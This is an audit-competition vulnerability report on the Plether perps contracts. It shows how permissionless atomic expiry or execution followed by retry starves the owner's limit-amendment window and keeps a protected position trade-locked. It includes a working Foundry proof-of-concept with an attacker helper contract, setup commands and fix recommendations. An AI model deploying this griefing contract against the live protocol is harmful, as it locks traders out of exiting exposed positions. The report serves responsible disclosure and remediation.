# \#98040 [SC-High] Permissionless atomic protection retries can starve the owner's limit amendment and keep the position trade-locked

**Submitted on Nov 4th 2026 at 15:08:20 UTC by @luff_y84 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98040
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

When a triggered position-protection close expires or fails terminally while the protected position still matches, the protocol briefly changes the protection from Triggered to Latched. Only the position owner may amend the retained close limits, and that amendment is possible only while the protection is Latched and has no pending child. However, any unprivileged caller may terminalize the child and call retryPositionProtectionClose in the same transaction. The retry consumes the transient Latched state and restores Triggered before the transaction returns. By repeatedly winning transaction ordering, an attacker can deny the owner the intended amendment window, keep a fresh close child pending, and leave the owner's live position trade-locked and exposed.

The demonstrated impact is Medium griefing. The attacker receives no bounty, settlement token, or other profit and must pay gas. The PoC makes no theft, permanent-freeze, or guaranteed-ordering claim.

## Root Cause

PositionProtectionBook.handleFailedProtectionAttempt changes a matching failed or expired protection attempt to Latched. The owner-only amendLatchedPositionProtectionCloseLimits function requires that exact state and an empty account queue.

In contrast, retryPositionProtectionClose deliberately performs no owner check. Any caller can invoke it while Latched. It commits a new protection close and _recordCloseAttempt immediately changes the protection back to Triggered. Because OrderRouter.expireOrder and OrderRouter.executeOrder are also permissionless, an arbitrary helper contract can combine terminalization and retry atomically:

1. Terminalize the current child, making the protection Latched.
2. Before returning control to the public mempool, call retryPositionProtectionClose.
3. Leave the transaction with a new live child and the protection Triggered.

No external owner transaction can interleave between those two calls. Active protection also blocks an ordinary manual order, and cancelPositionProtectionAndCommitClose accepts only Armed protection, not Triggered or Latched protection.

## Affected Code

At commit a82d4fefb02768e5b3bddcc97dee371eee24fea8:

- packages/perps/src/PositionProtectionBook.sol:315-328: the owner amendment requires Latched and no pending order.
- packages/perps/src/PositionProtectionBook.sol:341-368: the atomic owner cancel-and-close escape is restricted to Armed protection.
- packages/perps/src/PositionProtectionBook.sol:382-405: retry is permissionless and installs a fresh child.
- packages/perps/src/PositionProtectionBook.sol:564-577: recording that child restores Triggered.
- packages/perps/src/PositionProtectionBook.sol:637-667: terminal failure relatches the protection when the protected position still matches.
- packages/perps/src/OrderRouter.sol:191-196 and 233-247: expiry and execution/terminal classification are permissionless.
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:313-315: an active protection blocks an ordinary order commit.

## Preconditions and Attacker Model

- A trader has a live position and an active position protection whose generated close is Triggered.
- The generated close can terminally fail under its retained financial limits, or it reaches its normal execution deadline. The constraint-failure PoC uses a limit that exactly covers the position at the creation mark but becomes insufficient after an ordinary move to the stop-loss mark.
- The protected account, side, and size remain unchanged, so failure retains the protection as Latched.
- The attacker has no privileged role and needs no USDG balance. The expiry route can target an expired pending child even when it is not the global FIFO head, needs no oracle update, and pays no bounty. The constraint-failure route requires the child to be the executable global head (or its predecessors to be cleared), a later eligible block, and valid post-commit oracle data.
- To sustain the grief, the attacker must repeatedly win inclusion/ordering at each eligible execution block or expiry deadline.

## Attack Path

1. A protection trigger creates a full-position close attempt and changes the protection to Triggered.
2. The current attempt becomes eligible for terminal constraint failure or expires.
3. An attacker-controlled contract calls executeOrder or expireOrder and then retryPositionProtectionClose in one transaction.
4. Terminalization briefly sets Latched, but the immediate retry appends a fresh zero-bounty child and restores Triggered before transaction completion.
5. The owner's amendment reverts with OrderRouter__ProtectionNotLatched. A normal manual close reverts with OrderRouter__ProtectionActive, while cancelPositionProtectionAndCommitClose reverts because the protection is not Armed.
6. The attacker repeats the atomic recycle. The bounded PoC performs 61 expiry/retry cycles, advances the modeled timeline beyond one hour, and leaves the full position open, the protection active, and the newest child at the account queue head.

The separate constraint-failure test also proves that the attack need not wait for expiry: with a valid fresh publication and an eligible block, a naturally stale notional ceiling can terminally fail and be retried atomically.

## Impact

The owner is prevented from relaxing the very financial ceiling that caused the protected close to fail. While the attacker continues to win ordering, the position remains exposed to market movement and the active-protection lock prevents the owner from committing an ordinary exit.

The PoC asserts that:

- the position size remains unchanged;
- the protection remains active and Triggered after every attacker transaction;
- exactly one fresh protection child remains pending;
- owner amendment and both tested manual-exit paths revert;
- the trader's internal balance, action reserve, clearinghouse custody, and attacker balance do not change;
- the fresh retry reserves no execution bounty and the original trigger bounty is not paid again; and
- 61 bounded expiry/retry cycles sustain the lock for more than one hour.

This is classified only as griefing. The attacker receives no profit or bounty, no funds are stolen, and favorable execution, liquidation, or a successful owner recovery race can end the condition.

## Ordering and Smart-Account Caveat

This is an ordering-dependent grief, not an unconditional freeze. The attacker must win each terminalization opportunity against the owner or another actor trying to recover the position. A trader whose position is owned by a batching-capable account, including a supported contract account or a suitably delegated EOA, can submit its own atomic terminalize-plus-amend sequence, optionally followed by a retry, and compete for inclusion. That mitigation does not remove the permissionless race, but it means the PoC should not be interpreted as proving that every owner is inevitably locked or that the lock is permanent. A plain legacy EOA flow that terminalizes and amends in separate calls cannot interleave once an attacker atomically terminalizes and retries first.

## Why This Is Not the Published MED-9 Root Cause

Cecuro MED-9 reported that generated protection retries could omit the trader's financial limits. The pinned remediation retains those limits and adds the owner-only Latched amendment lane. This report does not claim omitted limits. It shows that the newly added amendment lane can be made externally unreachable by atomically composing two explicitly permissionless functions.

The public documentation discloses irreversible triggered protection, permissionless zero-bounty retry, unpaid cleanup, and the possibility of prolonged Latched state. It describes terminal processing and retry as separate keeper steps and states that the owner may amend before retry. It does not describe a hostile caller atomically consuming every Latched interval. The relevant fix boundary is therefore sequencing or owner priority around relatch/retry, not restoring the MED-9 financial limits. Nevertheless, because the underlying lifecycle and permissionless retry are documented, duplicate or intended-design rejection risk remains material; Immunefi and Plether make the final determination.

## Recommendation

Give the owner an enforceable recovery opportunity that cannot be consumed in the same transaction by an arbitrary caller. For example:

- introduce a bounded owner-priority period after each relatch, then reopen permissionless retry after that period;
- require owner authorization for an immediate retry while preserving delayed permissionless liveness;
- add an owner-only atomic amend-and-retry function and prevent third-party retry until that owner opportunity has elapsed; or
- allow an owner-authorized atomic exit from Latched/Triggered protection without weakening the protection lock for unrelated callers.

Regression tests should use an attacker helper that combines failure/expiry and retry in one call, verify that the owner has a deterministic amendment or exit path, and cover both the terminal constraint-failure and expiry routes.


## Link to Proof of Concept

https://gist.github.com/rockfish84/f49cfe7175f7508509a52e4305f14200

## Proof of Concept

## Environment

- Repository: https://github.com/immunefi-team/audit-comp-plether
- Frozen commit: a82d4fefb02768e5b3bddcc97dee371eee24fea8
- Foundry: Forge 1.5.1
- Solidity: 0.8.35
- Test root: packages/perps
- Fork/RPC: none; the test is fully local

## Files

Secret Gist (unlisted, `public:false`):

~~~text
https://gist.github.com/rockfish84/f49cfe7175f7508509a52e4305f14200
~~~

The complete PoC in that Gist is `ProtectionRetryAmendmentStarvationPoC.t.sol`
with SHA-256 `cfc798f6c7d32e867e28ca8fe36d9c1d6d42f72b24747448482295acd9aeacd6`.
Place it at:

~~~text
packages/perps/test/audit/ProtectionRetryAmendmentStarvationPoC.t.sol
~~~

No in-scope contract source needs to be changed.

## Setup

From an empty directory:

~~~bash
git clone https://gist.github.com/f49cfe7175f7508509a52e4305f14200.git plether-001-gist
cd plether-001-gist
test "$(git rev-parse HEAD)" = "53fff2b415411fdd111d9e2d81d4debbe4e568d7"
sha256sum -c SHA256SUMS
export PLETHER_GIST_DIR="$(pwd)"

git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git ../plether-poc
cd ../plether-poc
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
test "$(git rev-parse HEAD)" = "a82d4fefb02768e5b3bddcc97dee371eee24fea8"

# Use Foundry 1.5.1. This also verifies the selected binary.
foundryup --install v1.5.1
forge --version
forge --version | grep -F 'forge Version: 1.5.1-v1.5.1'

# Prime Solidity 0.8.35 before using the offline test command.
forge build --root packages/perps

mkdir -p packages/perps/test/audit
cp "$PLETHER_GIST_DIR/ProtectionRetryAmendmentStarvationPoC.t.sol" \
  packages/perps/test/audit/ProtectionRetryAmendmentStarvationPoC.t.sol

git diff --exit-code -- packages/perps/src
~~~

## Run Command

Run from packages/perps:

~~~bash
cd packages/perps
forge test --offline \
  --match-path test/audit/ProtectionRetryAmendmentStarvationPoC.t.sol \
  --match-test 'test_(PoC|Control)_' \
  -vv
~~~

## Test Code

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "../perps/spec/trader/PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

/// @notice Unprivileged helper that removes an expired child and immediately consumes the transient Latched state.
contract ProtectionRetryGriefer {

    function expireAndRetry(
        OrderRouter router,
        IPositionProtectionActions actions,
        uint64 expiredOrderId,
        uint64 protectionId
    ) external returns (uint64 retryOrderId) {
        router.expireOrder(expiredOrderId);
        retryOrderId = actions.retryPositionProtectionClose(protectionId);
    }

    function executeAndRetry(
        OrderRouter router,
        IPositionProtectionActions actions,
        IPositionProtectionViews views,
        uint64 failingOrderId,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    )
        external
        payable
        returns (
            OrderV3Types.ExecutionResult memory result,
            PositionProtectionTypes.PositionProtectionStatus statusBetweenCalls,
            uint64 retryOrderId
        )
    {
        result = router.executeOrder{value: msg.value}(failingOrderId, pythUpdateData);
        statusBetweenCalls = views.getPositionProtection(protectionId).status;
        retryOrderId = actions.retryPositionProtectionClose(protectionId);
    }

}

/// @notice Demonstrates that permissionless retries can indefinitely starve the owner's only close-limit amendment window.
contract ProtectionRetryAmendmentStarvationPoCTest is PositionProtectionTest {

    function test_Control_NoAtomicRetryLetsOwnerAmendAndClose() public {
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        params.closeLimits.maxExecutionNotionalAssets = (POSITION_SIZE * MARK_PRICE) / 1e20;

        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 failingAttemptId = _triggerAt(protectionId, LONG_STOP_LOSS);

        bytes[] memory failingData = _mockPythUpdateData(LONG_STOP_LOSS);
        OrderV3Types.ExecutionResult memory failure = router.executeOrder(failingAttemptId, failingData);
        assertEq(uint8(failure.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(failure.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "without an atomic retry the amendment window persists"
        );

        PositionProtectionTypes.CloseFinancialLimits memory executableLimits = _executableLimits();
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, executableLimits);
        _assertStoredCloseLimits(protectionId, executableLimits);

        uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        _assertPendingCloseLimits(retryOrderId, executableLimits);
        bytes[] memory retryData = _mockPythUpdateData(LONG_STOP_LOSS);
        OrderV3Types.ExecutionResult memory closeResult = router.executeOrder(retryOrderId, retryData);
        assertEq(uint8(closeResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, 0, "amended control retry closes successfully");
    }

    function test_PoC_ConstraintFailureAndRetryAtomicallyStarvesAmendmentEveryEligibleBlock() public {
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        // This is not an obviously malformed limit: it exactly covers the position at the 1e8 creation mark
        // (10,000e6). An ordinary move to the 1.1e8 stop-loss makes the execution notional 11,000e6.
        params.closeLimits.maxExecutionNotionalAssets = (POSITION_SIZE * MARK_PRICE) / 1e20;

        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 firstAttemptId = _triggerAt(protectionId, LONG_STOP_LOSS);

        ProtectionRetryGriefer griefer = new ProtectionRetryGriefer();
        uint256 aliceBalanceBefore = clearinghouse.balanceAssets(ALICE);
        uint256 grieferBalanceBefore = clearinghouse.balanceAssets(address(griefer));
        uint256 custodyBefore = settlementToken.balanceOf(address(clearinghouse));
        uint256 actionReserveBefore = clearinghouse.actionReserveAssets(ALICE);

        bytes[] memory firstExecutionData = _mockPythUpdateData(LONG_STOP_LOSS);
        uint256 gasBefore = gasleft();
        (
            OrderV3Types.ExecutionResult memory firstFailure,
            PositionProtectionTypes.PositionProtectionStatus firstIntermediateStatus,
            uint64 secondAttemptId
        ) = griefer.executeAndRetry(
            router, protectionActions, protectionViews, firstAttemptId, protectionId, firstExecutionData
        );
        emit log_named_uint("attacker gas for constraint-failure+retry", gasBefore - gasleft());
        assertEq(uint8(firstFailure.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(firstFailure.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(
            uint8(firstIntermediateStatus),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "failed execution relatches only inside the helper call"
        );
        _assertStarvedState(
            protectionId,
            secondAttemptId,
            aliceBalanceBefore,
            grieferBalanceBefore,
            custodyBefore,
            actionReserveBefore,
            address(griefer)
        );
        _assertOwnerAmendAndExitBlocked(protectionId);

        // The replacement needs only a later execution block and fresh publish time, not its deadline.
        uint64 secondDeadline = router.lifecycleBook().orderTiming(secondAttemptId).executionDeadline;
        assertGt(secondDeadline, block.timestamp, "replacement is still live, so this is not an expiry path");
        bytes[] memory secondExecutionData = _mockPythUpdateData(LONG_STOP_LOSS);
        (
            OrderV3Types.ExecutionResult memory secondFailure,
            PositionProtectionTypes.PositionProtectionStatus secondIntermediateStatus,
            uint64 thirdAttemptId
        ) = griefer.executeAndRetry(
            router, protectionActions, protectionViews, secondAttemptId, protectionId, secondExecutionData
        );
        assertEq(uint8(secondFailure.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(secondFailure.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(
            uint8(secondIntermediateStatus),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "second failure is also consumed before transaction return"
        );
        assertGt(thirdAttemptId, secondAttemptId, "each eligible-block cycle installs a fresh child");
        _assertStarvedState(
            protectionId,
            thirdAttemptId,
            aliceBalanceBefore,
            grieferBalanceBefore,
            custodyBefore,
            actionReserveBefore,
            address(griefer)
        );
    }

    function test_PoC_ExpireAndRetryAtomicallyStarvesOwnerAmendmentAndManualExit() public {
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        // This ceiling exactly covers the position at the creation mark, but becomes stale and too tight at the
        // ordinary stop-loss mark before the generated close is recycled.
        params.closeLimits.maxExecutionNotionalAssets = (POSITION_SIZE * MARK_PRICE) / 1e20;

        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 firstAttemptId = _triggerAt(protectionId, LONG_STOP_LOSS);

        ProtectionRetryGriefer griefer = new ProtectionRetryGriefer();
        uint256 aliceBalanceBefore = clearinghouse.balanceAssets(ALICE);
        uint256 grieferBalanceBefore = clearinghouse.balanceAssets(address(griefer));
        uint256 custodyBefore = settlementToken.balanceOf(address(clearinghouse));
        uint256 actionReserveBefore = clearinghouse.actionReserveAssets(ALICE);

        uint64 firstDeadline = router.lifecycleBook().orderTiming(firstAttemptId).executionDeadline;
        vm.warp(uint256(firstDeadline) + 1);
        uint256 gasBefore = gasleft();
        uint64 secondAttemptId = griefer.expireAndRetry(router, protectionActions, firstAttemptId, protectionId);
        emit log_named_uint("attacker gas for expire+retry", gasBefore - gasleft());

        _assertStarvedState(
            protectionId,
            secondAttemptId,
            aliceBalanceBefore,
            grieferBalanceBefore,
            custodyBefore,
            actionReserveBefore,
            address(griefer)
        );

        _assertOwnerAmendAndExitBlocked(protectionId);

        // The same unprivileged atomic recycle works at every fresh deadline, with no token/bounty payment to the griefer.
        uint64 secondDeadline = router.lifecycleBook().orderTiming(secondAttemptId).executionDeadline;
        vm.warp(uint256(secondDeadline) + 1);
        uint64 thirdAttemptId = griefer.expireAndRetry(router, protectionActions, secondAttemptId, protectionId);
        assertGt(thirdAttemptId, secondAttemptId, "each grief cycle installs a fresh live child");
        _assertStarvedState(
            protectionId,
            thirdAttemptId,
            aliceBalanceBefore,
            grieferBalanceBefore,
            custodyBefore,
            actionReserveBefore,
            address(griefer)
        );
    }

    function test_PoC_ExpiryRecycleSustainsTheTradeLockForMoreThanOneHour() public {
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        params.closeLimits.maxExecutionNotionalAssets = (POSITION_SIZE * MARK_PRICE) / 1e20;

        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 liveAttemptId = _triggerAt(protectionId, LONG_STOP_LOSS);
        ProtectionRetryGriefer griefer = new ProtectionRetryGriefer();
        PositionProtectionTypes.CloseFinancialLimits memory executableLimits = _executableLimits();
        uint256 startedAt = vm.getBlockTimestamp();

        // The default protection attempt window is 60 seconds. Sixty-one bounded attacker recycles model more than
        // one hour of sustained ordering wins without oracle data, bounty income, or a protocol-enforced retry cap.
        for (uint256 i; i < 61; ++i) {
            uint64 deadline = router.lifecycleBook().orderTiming(liveAttemptId).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            liveAttemptId = griefer.expireAndRetry(router, protectionActions, liveAttemptId, protectionId);

            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, executableLimits);
        }

        assertGt(vm.getBlockTimestamp() - startedAt, 1 hours, "bounded recycle must exceed one hour");
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "the final attacker transaction still leaves no amendment window"
        );
        assertEq(protectionViews.activePositionProtectionId(ALICE), protectionId, "trade lock remains active");
        assertEq(router.accountHeadOrderId(ALICE), liveAttemptId, "the latest retry remains the queue head");
        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, POSITION_SIZE, "the owner remains exposed for the whole modeled hour");
    }

    function _assertOwnerAmendAndExitBlocked(
        uint64 protectionId
    ) private {
        PositionProtectionTypes.CloseFinancialLimits memory executableLimits = _executableLimits();
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, executableLimits);

        OrderV3Types.OrderRequest memory manualClose = _manualCloseRequest(CfdTypes.Side.LONG);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(manualClose);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, manualClose);
    }

    function _executableLimits() private pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 25_000e6,
            maxGrossAccountDebitAssets: 25_000e6,
            maxActionChargeAssets: 25_000e6,
            maxExplicitFeesAssets: 25_000e6
        });
    }

    function _assertStarvedState(
        uint64 protectionId,
        uint64 liveAttemptId,
        uint256 aliceBalanceBefore,
        uint256 grieferBalanceBefore,
        uint256 custodyBefore,
        uint256 actionReserveBefore,
        address griefer
    ) private view {
        PositionProtectionTypes.PositionProtectionView memory protection =
            protectionViews.getPositionProtection(protectionId);
        assertEq(
            uint8(protection.status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "atomic retry leaves no owner-callable Latched interval"
        );
        assertEq(protectionViews.activePositionProtectionId(ALICE), protectionId, "trade lock remains active");
        assertEq(protection.linkedOrderId, liveAttemptId, "fresh child replaces expired child");
        assertEq(router.accountHeadOrderId(ALICE), liveAttemptId, "fresh child is the account queue head");
        assertEq(router.pendingOrderCounts(ALICE), 1, "exactly one griefing child remains pending");
        assertTrue(
            router.lifecycleBook().isProtectionAttempt(liveAttemptId), "fresh child keeps protection attribution"
        );
        assertEq(router.getAccountReservations(ALICE).executionBountyAssets, 0, "retry has zero bounty reserve");
        assertEq(protection.triggerBountyAssets, 0, "trigger bounty was already paid once");
        assertEq(clearinghouse.balanceAssets(ALICE), aliceBalanceBefore, "recycling does not move owner settlement");
        assertEq(clearinghouse.balanceAssets(griefer), grieferBalanceBefore, "griefer receives no settlement bounty");
        assertEq(
            clearinghouse.actionReserveAssets(ALICE), actionReserveBefore, "recycling does not move action reserve"
        );
        assertEq(settlementToken.balanceOf(address(clearinghouse)), custodyBefore, "clearinghouse custody is unchanged");
    }

}
~~~

## Expected Output

Forge 1.5.1 reports four passing tests:

~~~text
[PASS] test_Control_NoAtomicRetryLetsOwnerAmendAndClose()
[PASS] test_PoC_ConstraintFailureAndRetryAtomicallyStarvesAmendmentEveryEligibleBlock()
[PASS] test_PoC_ExpireAndRetryAtomicallyStarvesOwnerAmendmentAndManualExit()
[PASS] test_PoC_ExpiryRecycleSustainsTheTradeLockForMoreThanOneHour()
Suite result: ok. 4 passed; 0 failed; 0 skipped
~~~

The validated command completed with 4/4 passing under Forge 1.5.1.

## Control Case

test_Control_NoAtomicRetryLetsOwnerAmendAndClose terminally fails the original child but does not let a third party consume Latched. The owner then amends the retained ceilings, the retry stores the amended limits, and the resulting close executes successfully. This establishes that atomic permissionless retry, rather than the initial constraint failure alone, removes the amendment opportunity.

## What the Assertions Prove

- Constraint-failure route: a realistic price move can make a creation-time notional ceiling terminally fail; failure and retry can be combined atomically in every eligible block.
- Expiry route: no oracle payload is needed; expiry and retry can be combined at each fresh deadline.
- Liveness impact: 61 recycle cycles advance beyond one hour while every owner amendment attempt reverts and the position remains open.
- Trade lock: ordinary manual close and the Armed-only atomic cancel-and-close route are both unavailable.
- Economics: the attacker gets no bounty or settlement credit, custody is unchanged, and the demonstrated impact is griefing rather than theft.
- Causality: without the immediate attacker retry, the owner amendment works and the next attempt closes.
